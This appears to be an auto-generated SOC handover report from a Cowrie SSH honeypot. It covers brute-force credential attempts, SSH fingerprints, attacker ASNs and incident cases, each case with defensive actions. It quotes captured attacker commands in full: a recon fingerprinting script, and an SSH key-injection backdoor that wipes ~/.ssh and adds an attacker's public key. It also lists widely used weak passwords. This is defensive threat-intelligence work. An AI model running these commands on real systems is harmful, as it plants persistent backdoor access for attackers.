# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-29 |
| **Generated At** | 2026-08-29T20:42:13Z |
| **Shift Time** | 20:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **303** |
| Confirmed Threats | **280** |
| False Positives Filtered | **23** (7.6%) |
| Unique Attacker IPs | **135** |
| Countries of Origin | **36** |
| High Severity Cases | **221** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **82** |
| Malware Samples Analyzed | **3** HIGH · **20** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **290** |
| Unique Credential Pairs | **161** |
| Unique Usernames | **32** |
| Unique Passwords | **148** |
| Successful Auth Pairs | **255** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 116 |
| `ubuntu` | 25 |
| `345gs5662d34` | 20 |
| `support` | 16 |
| `admin` | 16 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 21 |
| `345gs5662d34` | 20 |
| `333` | 12 |
| `88888` | 6 |
| `zpz}ld	` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 20 |
| `root` | `3245gs5662d34` | 12 |
| `root` | `88888` | 6 |
| `lghkel	` | `zpz}ld	` | 6 |
| `admin` | `admin` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@ssw0rd1234567890` | `217.60.255.130` | 2026-08-29T14:55:47 |
| `ubuntu` | `Farhad@1234` | `217.60.255.130` | 2026-08-29T14:57:42 |
| `dashboard` | `asdfghjkl` | `213.209.159.230` | 2026-08-29T15:02:15 |
| `root` | `Admin@1qaz` | `152.32.163.183` | 2026-08-29T15:04:20 |
| `root` | `3245gs5662d34` | `152.32.163.183` | 2026-08-29T15:04:45 |
| `root` | `Passw0rd123456!` | `217.60.255.130` | 2026-08-29T15:06:39 |
| `ubnt` | `ubnt11` | `203.193.147.75` | 2026-08-29T15:07:14 |
| `ubuntu` | `Masoud1234` | `217.60.255.130` | 2026-08-29T15:07:18 |
| `user` | `user333` | `196.188.93.169` | 2026-08-29T15:10:22 |
| `user` | `user333` | `65.20.237.119` | 2026-08-29T15:10:29 |
| `user` | `user333` | `111.70.10.15` | 2026-08-29T15:10:31 |
| `user` | `user333` | `93.177.157.179` | 2026-08-29T15:10:39 |
| `root` | `` | `193.138.245.205` | 2026-08-29T15:11:06 |
| `supervisor` | `supervisor2007` | `116.59.10.205` | 2026-08-29T15:12:17 |
| `supervisor` | `supervisor2007` | `113.200.216.246` | 2026-08-29T15:12:27 |
| `ubuntu` | `Alireza1234` | `217.60.255.130` | 2026-08-29T15:16:42 |
| `root` | `qazwsx` | `217.60.255.130` | 2026-08-29T15:17:14 |
| `root` | `88888` | `10.0.0.73` | 2026-08-29T15:19:23 |
| `root` | `88888` | `196.190.41.137` | 2026-08-29T15:20:57 |
| `root` | `88888` | `218.22.0.200` | 2026-08-29T15:21:09 |
| `supervisor` | `supervisor2007` | `10.0.0.73` | 2026-08-29T15:23:17 |
| `ubuntu` | `Kambiz1234` | `217.60.255.130` | 2026-08-29T15:26:20 |
| `root` | `@dm!n1234` | `217.60.255.130` | 2026-08-29T15:28:06 |
| `root` | `ivdev` | `14.33.48.192` | 2026-08-29T15:34:39 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\x8f\x8f\x8f\x8f'` | `14.33.48.192` | 2026-08-29T15:35:13 |
| `lghkel	` | `zpz}ld	` | `14.33.48.192` | 2026-08-29T15:35:14 |
| `root` | `Qaz@2026` | `189.244.61.51` | 2026-08-29T15:35:34 |
| `345gs5662d34` | `345gs5662d34` | `189.244.61.51` | 2026-08-29T15:35:36 |
| `root` | `3245gs5662d34` | `189.244.61.51` | 2026-08-29T15:35:36 |
| `b'\x8f\x8c\x8d'` | `b'\x8f\x8c\x8d'` | `14.33.48.192` | 2026-08-29T15:35:48 |
| `ubuntu` | `host123` | `217.60.255.130` | 2026-08-29T15:35:53 |
| `root` | `GM8182` | `14.33.48.192` | 2026-08-29T15:36:22 |
| `root` | `88888` | `2.179.194.193` | 2026-08-29T15:36:24 |
| `root` | `88888` | `37.57.158.182` | 2026-08-29T15:36:31 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\x8f\x8c\x8d\x8a'` | `14.33.48.192` | 2026-08-29T15:36:56 |
| `b'\xcc\xd1\xd1\xca'` | `b'\x8b\xcb\xce'` | `14.33.48.192` | 2026-08-29T15:37:30 |
| `b'\xcd\xcb\xce\xce\xd1\xcc\xca'` | `b'\xcd\xcb\xce\xce\xd1\xcc\xca'` | `14.33.48.192` | 2026-08-29T15:38:04 |
| `root` | `Password@123` | `217.60.255.130` | 2026-08-29T15:38:35 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\xd9\xcb\xdb\xcd\xca'` | `14.33.48.192` | 2026-08-29T15:38:39 |
| `root` | `fidel123` | `14.33.48.192` | 2026-08-29T15:39:14 |
| `supervisor` | `supervisor2007` | `88.249.10.161` | 2026-08-29T15:39:48 |
| `root` | `vizxv` | `14.33.48.192` | 2026-08-29T15:39:49 |
| `supervisor` | `supervisor2007` | `65.20.141.202` | 2026-08-29T15:39:56 |
| `support` | `support666` | `66.179.137.169` | 2026-08-29T15:42:40 |
| `support` | `support666` | `222.76.248.54` | 2026-08-29T15:43:04 |
| `root` | `555` | `59.22.68.213` | 2026-08-29T15:44:41 |
| `test123` | `123123123` | `213.209.159.230` | 2026-08-29T15:44:50 |
| `root` | `555` | `49.124.153.50` | 2026-08-29T15:44:52 |
| `ubuntu` | `Hadi1234` | `217.60.255.130` | 2026-08-29T15:45:11 |
| `root` | `Password@12345` | `217.60.255.130` | 2026-08-29T15:49:27 |
| `admin` | `admin` | `36.111.146.165` | 2026-08-29T15:50:42 |
| `ubnt` | `888` | `10.0.0.73` | 2026-08-29T15:52:01 |
| `ubuntu` | `Admin2023` | `217.60.255.130` | 2026-08-29T15:54:52 |
| `root` | `555` | `10.0.0.73` | 2026-08-29T15:55:48 |
| `root` | `P@ssw0rd123#` | `217.60.255.130` | 2026-08-29T16:00:35 |
| `support` | `support` | `10.0.0.73` | 2026-08-29T16:02:29 |
| `ubuntu` | `Athul@123` | `217.60.255.130` | 2026-08-29T16:04:43 |
| `vhserver` | `123456` | `152.32.182.8` | 2026-08-29T16:08:20 |
| `345gs5662d34` | `345gs5662d34` | `152.32.182.8` | 2026-08-29T16:08:21 |
| `vhserver` | `3245gs5662d34` | `152.32.182.8` | 2026-08-29T16:08:21 |
| `ubnt` | `888` | `37.255.251.226` | 2026-08-29T16:08:58 |
| `testuser` | `qwerty` | `20.91.137.76` | 2026-08-29T16:09:26 |
| `345gs5662d34` | `345gs5662d34` | `20.91.137.76` | 2026-08-29T16:09:29 |
| `testuser` | `3245gs5662d34` | `20.91.137.76` | 2026-08-29T16:09:29 |
| `root` | `Info@2024` | `217.60.255.130` | 2026-08-29T16:11:07 |
| `root` | `555` | `209.14.89.110` | 2026-08-29T16:12:27 |
| `root` | `wolf` | `163.47.134.124` | 2026-08-29T16:13:13 |
| `345gs5662d34` | `345gs5662d34` | `163.47.134.124` | 2026-08-29T16:13:15 |
| `root` | `3245gs5662d34` | `163.47.134.124` | 2026-08-29T16:13:16 |
| `ubuntu` | `Ahir@123` | `217.60.255.130` | 2026-08-29T16:14:04 |
| `ubnt` | `ubnt222` | `183.96.163.213` | 2026-08-29T16:15:02 |
| `ubnt` | `ubnt222` | `81.215.2.43` | 2026-08-29T16:15:10 |
| `ubnt` | `ubnt222` | `196.189.59.226` | 2026-08-29T16:15:19 |
| `test` | `000000` | `123.52.202.92` | 2026-08-29T16:17:20 |
| `root` | `123456aa` | `217.60.255.130` | 2026-08-29T16:22:03 |
| `ubuntu` | `Rishu@123` | `217.60.255.130` | 2026-08-29T16:23:41 |
| `test` | `333` | `10.0.0.73` | 2026-08-29T16:24:18 |
| `test` | `333` | `117.34.210.196` | 2026-08-29T16:25:54 |
| `test` | `333` | `70.91.135.181` | 2026-08-29T16:26:07 |
| `test` | `000000` | `10.0.0.73` | 2026-08-29T16:28:19 |
| `guest` | `guest666` | `10.0.0.73` | 2026-08-29T16:29:55 |
| `console` | `snoopy1` | `213.209.159.230` | 2026-08-29T16:30:20 |
| `root` | `1234560` | `10.0.0.73` | 2026-08-29T16:31:54 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-08-29T16:31:58 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T16:32:00 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-29T16:32:21 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-29T16:32:21 |
| `root` | `-1234567890` | `217.60.255.130` | 2026-08-29T16:32:58 |
| `ubuntu` | `Himanshu@123` | `217.60.255.130` | 2026-08-29T16:33:24 |
| `crm` | `crm` | `10.0.0.73` | 2026-08-29T16:33:44 |
| `root` | `1QAZ!qaz` | `10.0.0.73` | 2026-08-29T16:33:47 |
| `crm` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T16:33:50 |
| `root` | `!root` | `2.57.122.150` | 2026-08-29T16:33:52 |
| `root` | `xu@123456` | `10.0.0.73` | 2026-08-29T16:34:03 |
| `root` | `111111` | `2.57.122.150` | 2026-08-29T16:35:43 |
| `deploy` | `secret` | `10.0.0.73` | 2026-08-29T16:36:44 |
| `deploy` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T16:36:47 |
| `demo` | `1234` | `10.0.0.73` | 2026-08-29T16:36:58 |
| `demo` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T16:37:03 |
| `root` | `123123` | `2.57.122.150` | 2026-08-29T16:37:37 |
| `root` | `123321` | `2.57.122.150` | 2026-08-29T16:39:30 |
| `tx` | `tx` | `10.0.0.73` | 2026-08-29T16:41:14 |
| `tx` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T16:41:20 |
| `test` | `333` | `120.224.15.67` | 2026-08-29T16:41:21 |
| `test` | `333` | `103.251.143.14` | 2026-08-29T16:41:30 |
| `root` | `1234` | `2.57.122.150` | 2026-08-29T16:41:33 |
| `ubuntu` | `Tata@123` | `217.60.255.130` | 2026-08-29T16:42:42 |
| `root` | `123456789aA@` | `217.60.255.130` | 2026-08-29T16:43:29 |
| `root` | `12345` | `2.57.122.150` | 2026-08-29T16:43:29 |
| `support` | `support` | `176.53.159.196` | 2026-08-29T16:43:34 |
| `test` | `000000` | `203.252.10.4` | 2026-08-29T16:44:39 |
| `test` | `000000` | `81.237.251.198` | 2026-08-29T16:44:47 |
| `root` | `1234567` | `2.57.122.150` | 2026-08-29T16:47:05 |
| `guest` | `guest666` | `43.162.90.45` | 2026-08-29T16:47:29 |
| `guest` | `guest666` | `122.187.230.82` | 2026-08-29T16:47:39 |
| `guest` | `guest666` | `171.217.70.151` | 2026-08-29T16:47:40 |
| `guest` | `guest666` | `83.239.84.130` | 2026-08-29T16:47:48 |
| `root` | `12345678` | `2.57.122.150` | 2026-08-29T16:48:52 |
| `support` | `6666` | `49.124.148.206` | 2026-08-29T16:49:42 |
| `root` | `123456789` | `2.57.122.150` | 2026-08-29T16:50:40 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-29T16:51:29 |
| `ubuntu` | `Arshia123` | `217.60.255.130` | 2026-08-29T16:52:20 |
| `root` | `1234567890` | `2.57.122.150` | 2026-08-29T16:52:21 |
| `root` | `123456a` | `2.57.122.150` | 2026-08-29T16:54:01 |
| `root` | `Password@2` | `217.60.255.130` | 2026-08-29T16:54:18 |
| `root` | `123456b` | `2.57.122.150` | 2026-08-29T16:55:53 |
| `centos` | `centos11` | `10.0.0.73` | 2026-08-29T16:56:44 |
| `centos` | `centos11` | `112.196.52.107` | 2026-08-29T16:58:17 |
| `centos` | `centos11` | `27.107.102.154` | 2026-08-29T16:58:26 |
| `root` | `1234abcd` | `2.57.122.150` | 2026-08-29T16:58:32 |
| `root` | `123abc` | `2.57.122.150` | 2026-08-29T17:00:21 |
| `support` | `6666` | `10.0.0.73` | 2026-08-29T17:00:42 |
| `ubuntu` | `Abbasi@123` | `217.60.255.130` | 2026-08-29T17:01:54 |
| `supervisor` | `supervisor2019` | `10.0.0.73` | 2026-08-29T17:02:08 |
| `root` | `123qwe` | `2.57.122.150` | 2026-08-29T17:02:14 |
| `root` | `1q2w3e4r` | `2.57.122.150` | 2026-08-29T17:04:15 |
| `root` | `woaini520` | `217.60.255.130` | 2026-08-29T17:04:52 |
| `root` | `1qaz2wsx` | `2.57.122.150` | 2026-08-29T17:06:21 |
| `root` | `1qaz@WSX` | `2.57.122.150` | 2026-08-29T17:08:36 |
| `root` | `21` | `2.57.122.150` | 2026-08-29T17:10:36 |
| `ubuntu` | `Sunrise@123` | `217.60.255.130` | 2026-08-29T17:11:14 |
| `root` | `Support2024@` | `97.74.87.152` | 2026-08-29T17:11:33 |
| `345gs5662d34` | `345gs5662d34` | `97.74.87.152` | 2026-08-29T17:11:37 |
| `root` | `3245gs5662d34` | `97.74.87.152` | 2026-08-29T17:11:39 |
| `root` | `321` | `2.57.122.150` | 2026-08-29T17:12:29 |
| `portal` | `maggie` | `213.209.159.230` | 2026-08-29T17:12:50 |
| `centos` | `centos11` | `111.70.32.10` | 2026-08-29T17:13:38 |
| `centos` | `centos11` | `117.248.201.39` | 2026-08-29T17:13:47 |
| `root` | `4321` | `2.57.122.150` | 2026-08-29T17:15:11 |
| `root` | `Aa.123456` | `217.60.255.130` | 2026-08-29T17:15:43 |
| `root` | `Abc@123.` | `195.86.192.66` | 2026-08-29T17:16:14 |
| `345gs5662d34` | `345gs5662d34` | `195.86.192.66` | 2026-08-29T17:16:18 |
| `root` | `3245gs5662d34` | `195.86.192.66` | 2026-08-29T17:16:20 |
| `root` | `1q@W3e` | `41.93.28.9` | 2026-08-29T17:16:37 |
| `345gs5662d34` | `345gs5662d34` | `41.93.28.9` | 2026-08-29T17:16:41 |
| `root` | `3245gs5662d34` | `41.93.28.9` | 2026-08-29T17:16:43 |
| `software` | `12345678` | `194.156.249.154` | 2026-08-29T17:17:11 |
| `345gs5662d34` | `345gs5662d34` | `194.156.249.154` | 2026-08-29T17:17:14 |
| `software` | `3245gs5662d34` | `194.156.249.154` | 2026-08-29T17:17:15 |
| `supervisor` | `supervisor2019` | `65.20.237.94` | 2026-08-29T17:19:36 |
| `root` | `54321` | `2.57.122.150` | 2026-08-29T17:19:37 |
| `supervisor` | `supervisor2019` | `179.184.85.167` | 2026-08-29T17:19:44 |
| `supervisor` | `supervisor2019` | `65.20.132.230` | 2026-08-29T17:19:49 |
| `supervisor` | `supervisor2019` | `210.177.143.61` | 2026-08-29T17:19:58 |
| `root` | `Password@2023` | `103.161.113.136` | 2026-08-29T17:20:00 |
| `345gs5662d34` | `345gs5662d34` | `103.161.113.136` | 2026-08-29T17:20:04 |
| `root` | `3245gs5662d34` | `103.161.113.136` | 2026-08-29T17:20:05 |
| `ubuntu` | `Anuj@123` | `217.60.255.130` | 2026-08-29T17:20:50 |
| `admin` | `66666` | `96.56.228.149` | 2026-08-29T17:21:57 |
| `admin` | `66666` | `70.184.183.12` | 2026-08-29T17:22:04 |
| `eramirez` | `eramirez` | `10.0.0.73` | 2026-08-29T17:22:39 |
| `eramirez` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T17:22:45 |
| `root` | `555555` | `2.57.122.150` | 2026-08-29T17:25:25 |
| `root` | `)(*&^%$#@!` | `217.60.255.130` | 2026-08-29T17:26:32 |
| `admin` | `admin` | `47.77.182.54` | 2026-08-29T17:27:34 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-29T17:27:35 |
| `admin` | `333` | `10.0.0.73` | 2026-08-29T17:28:58 |
| `root` | `654321` | `2.57.122.150` | 2026-08-29T17:29:21 |
| `ubuntu` | `Karthi@123` | `217.60.255.130` | 2026-08-29T17:30:30 |
| `admin` | `333` | `117.248.201.39` | 2026-08-29T17:30:31 |
| `admin` | `333` | `178.178.194.128` | 2026-08-29T17:30:38 |
| `support` | `support333` | `10.0.0.73` | 2026-08-29T17:34:15 |
| `root` | `7777777` | `2.57.122.150` | 2026-08-29T17:35:01 |
| `root` | `System@1234` | `217.60.255.130` | 2026-08-29T17:37:12 |
| `root` | `Admin2026!` | `2.57.122.150` | 2026-08-29T17:39:46 |
| `ubuntu` | `Nazim@123` | `217.60.255.130` | 2026-08-29T17:39:51 |
| `root` | `P4ssw0rd` | `2.57.122.150` | 2026-08-29T17:42:30 |
| `root` | `P4ssword` | `2.57.122.150` | 2026-08-29T17:45:13 |
| `admin` | `333` | `182.135.63.175` | 2026-08-29T17:46:00 |
| `admin` | `333` | `66.175.138.122` | 2026-08-29T17:46:08 |
| `root` | `12345abcde` | `217.60.255.130` | 2026-08-29T17:48:01 |
| `admin` | `66666` | `85.225.13.121` | 2026-08-29T17:49:10 |
| `root` | `P@ssw0rd` | `2.57.122.150` | 2026-08-29T17:49:15 |
| `admin` | `66666` | `35.130.111.98` | 2026-08-29T17:49:17 |
| `ubuntu` | `Asc@123` | `217.60.255.130` | 2026-08-29T17:49:30 |
| `root` | `﻿------fuck------` | `111.36.57.69` | 2026-08-29T17:51:11 |
| `support` | `support333` | `65.20.191.231` | 2026-08-29T17:51:28 |
| `support` | `support333` | `120.234.232.184` | 2026-08-29T17:51:43 |
| `support` | `support333` | `112.26.101.76` | 2026-08-29T17:51:57 |
| `operator` | `operator2024` | `211.58.176.42` | 2026-08-29T17:54:02 |
| `operator` | `operator2024` | `202.53.94.242` | 2026-08-29T17:54:11 |
| `root` | `P@ssw0rd2026` | `2.57.122.150` | 2026-08-29T17:54:37 |
| `proxy` | `daniel` | `213.209.159.230` | 2026-08-29T17:55:04 |
| `root` | `P@ssw0rd!@#$%` | `217.60.255.130` | 2026-08-29T17:58:51 |
| `ubuntu` | `Hassan123` | `217.60.255.130` | 2026-08-29T17:59:04 |
| `root` | `P@ssword` | `2.57.122.150` | 2026-08-29T17:59:33 |
| `root` | `Tc@123456` | `49.212.154.161` | 2026-08-29T17:59:35 |
| `345gs5662d34` | `345gs5662d34` | `49.212.154.161` | 2026-08-29T17:59:38 |
| `root` | `3245gs5662d34` | `49.212.154.161` | 2026-08-29T17:59:39 |
| `centos` | `centos000` | `10.0.0.73` | 2026-08-29T18:01:41 |
| `sns` | `sns@123` | `117.218.75.251` | 2026-08-29T18:02:25 |
| `345gs5662d34` | `345gs5662d34` | `117.218.75.251` | 2026-08-29T18:02:30 |
| `sns` | `3245gs5662d34` | `117.218.75.251` | 2026-08-29T18:02:33 |
| `root` | `sun12345` | `61.155.106.101` | 2026-08-29T18:02:49 |
| `345gs5662d34` | `345gs5662d34` | `61.155.106.101` | 2026-08-29T18:02:53 |
| `root` | `3245gs5662d34` | `61.155.106.101` | 2026-08-29T18:02:55 |
| `operator` | `operator2024` | `10.0.0.73` | 2026-08-29T18:04:54 |
| `root` | `55555` | `10.0.0.73` | 2026-08-29T18:06:17 |
| `ubuntu` | `Ela12345` | `217.60.255.130` | 2026-08-29T18:08:30 |
| `root` | `Dialog@123` | `217.60.255.130` | 2026-08-29T18:09:32 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-29T18:13:30 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-29T18:13:30 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-29T18:13:39 |
| `root` | `123qwerty` | `195.178.110.227` | 2026-08-29T18:16:49 |
| `centos` | `centos000` | `63.135.169.175` | 2026-08-29T18:18:37 |
| `centos` | `centos000` | `216.232.226.217` | 2026-08-29T18:18:49 |
| `ubuntu` | `Qazwsxedc123` | `217.60.255.130` | 2026-08-29T18:19:00 |
| `root` | `21` | `195.178.110.227` | 2026-08-29T18:19:01 |
| `operator` | `operator2024` | `187.218.57.50` | 2026-08-29T18:21:15 |
| `root` | `123abc123` | `217.60.255.130` | 2026-08-29T18:21:17 |
| `root` | `321` | `195.178.110.227` | 2026-08-29T18:21:17 |
| `operator` | `operator2024` | `218.15.224.102` | 2026-08-29T18:21:24 |
| `root` | `4321` | `195.178.110.227` | 2026-08-29T18:23:36 |
| `root` | `55555` | `65.20.251.170` | 2026-08-29T18:23:49 |
| `root` | `55555` | `187.8.3.230` | 2026-08-29T18:23:57 |
| `root` | `54321` | `195.178.110.227` | 2026-08-29T18:25:46 |
| `user` | `99999` | `124.160.255.140` | 2026-08-29T18:26:06 |
| `root` | `P4ssw0rd` | `195.178.110.227` | 2026-08-29T18:27:49 |
| `ubuntu` | `Welcome123` | `217.60.255.130` | 2026-08-29T18:28:46 |
| `root` | `P4ssword` | `195.178.110.227` | 2026-08-29T18:30:04 |
| `root` | `password@123` | `217.60.255.130` | 2026-08-29T18:32:17 |
| `root` | `P@ssw0rd` | `195.178.110.227` | 2026-08-29T18:32:21 |
| `user` | `8` | `10.0.0.73` | 2026-08-29T18:34:13 |
| `root` | `Passw0rd` | `195.178.110.227` | 2026-08-29T18:34:38 |
| `user` | `99999` | `10.0.0.73` | 2026-08-29T18:36:57 |
| `root123` | `nicole` | `213.209.159.230` | 2026-08-29T18:37:19 |
| `support` | `666666` | `10.0.0.73` | 2026-08-29T18:38:16 |
| `ubuntu` | `Bsnl@123` | `217.60.255.130` | 2026-08-29T18:38:47 |
| `root` | `zaq!@wsx` | `217.60.255.130` | 2026-08-29T18:43:28 |
| `ubuntu` | `QWEasdZXC@123` | `217.60.255.130` | 2026-08-29T18:48:30 |
| `user` | `8` | `196.189.124.218` | 2026-08-29T18:51:10 |
| `user` | `8` | `209.145.59.90` | 2026-08-29T18:51:17 |
| `user` | `99999` | `118.123.116.93` | 2026-08-29T18:53:08 |
| `user` | `99999` | `84.5.129.68` | 2026-08-29T18:53:16 |
| `root` | `a1234567` | `217.60.255.130` | 2026-08-29T18:54:22 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **303** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 103 |
| OpenSSH | 66 |
| Go SSH scanner | 53 |
| Paramiko (Python) | 6 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 66 | 65 |
| `419da4c91ddb...` | Modern SSH client | 48 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 42 | 2 |
| `f555226df196...` | Mirai/variant | 40 | 14 |
| `16443846184e...` | Generic scanner | 7 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 66 | 65 | Mirai/variant |
| `419da4c91ddb...` | libssh | 48 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 42 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 40 | 14 | Mirai/variant |
| `95420f9d932d...` | libssh | 14 | 4 | — |
| `16443846184e...` | Go SSH scanner | 7 | 2 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 40 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 13 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.150`, `195.178.110.227`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.32.163.183`, `189.244.61.51`, `61.155.106.101`, `20.91.137.76`, `195.86.192.66`, `163.47.134.124`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **135** |
| Unique ASNs | **88** |
| High-Risk ASNs | **77** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 7 | HIGH |
| `AS24757` | Ethio Telecom | 4 | HIGH |
| `AS58224` | Iran Telecommunication Company PJS | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS3301` | Telia Company AB | 3 | HIGH |
| `AS17421` | Mobile Business Group | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (220)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-999daf91c205

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:55 |
| **Last Seen** | 2026-08-29 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:55:46` | `cowrie.session.connect` |
| `2026-08-29 14:55:46` | `cowrie.client.version` |
| `2026-08-29 14:55:46` | `cowrie.client.kex` |
| `2026-08-29 14:55:47` | `cowrie.login.success` |
| `2026-08-29 14:55:47` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:55:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:55:47` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7d541539407

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:57 |
| **Last Seen** | 2026-08-29 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:57:40` | `cowrie.session.connect` |
| `2026-08-29 14:57:40` | `cowrie.client.version` |
| `2026-08-29 14:57:41` | `cowrie.client.kex` |
| `2026-08-29 14:57:42` | `cowrie.login.success` |
| `2026-08-29 14:57:42` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:57:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:57:42` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
